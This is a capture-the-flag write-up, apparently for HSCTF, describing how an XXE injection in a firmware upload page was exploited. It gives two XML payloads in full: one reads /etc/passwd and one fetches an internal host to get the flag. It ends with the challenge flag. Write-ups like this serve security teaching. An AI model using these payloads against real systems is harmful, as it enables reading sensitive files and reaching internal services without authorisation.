You are given a page where you can upload firmware to some docker containers.
![alt text](https://github.com/S0UL4/CTF-Writeups/blob/master/HSCTF/Web-Traffic-Light/main.png?raw=true)


Clicking in Upload firmware And here we are 

![alt text](https://github.com/S0UL4/CTF-Writeups/blob/master/HSCTF/Web-Traffic-Light/xml.png?raw=true)


the first thing that came to my mind is to test if there is an XXE so
tried to read the "passwd" file and yes ! it works ! we have an XXE injection !

code to read /etc/passwd


``` <?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <content>&xxe;</content>
</root>
```
Outputs : 

![alt text](https://github.com/Jord4563/CTF-writeups/blob/master/HSCTF2020/traffic-lights-w/passwd.png?raw=true)


So now we have to look for the flag location ! i tried /home/flag.txt and /flag.txt but i didn't find nothing  ! 
after that i noticed that we have an open port 80 in traffic-light-1004 
So tried to acces it with : 

``` <?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://traffic-light-1004/"> ]>
<root>
  <content>&xxe;</content>
</root>
```

And Boooom !! we got our Flag 

![alt text](https://github.com/Jord4563/CTF-writeups/blob/master/HSCTF2020/traffic-lights-w/sol.png?raw=true)


Flag: flag{shh_im_mining_bitcoin}


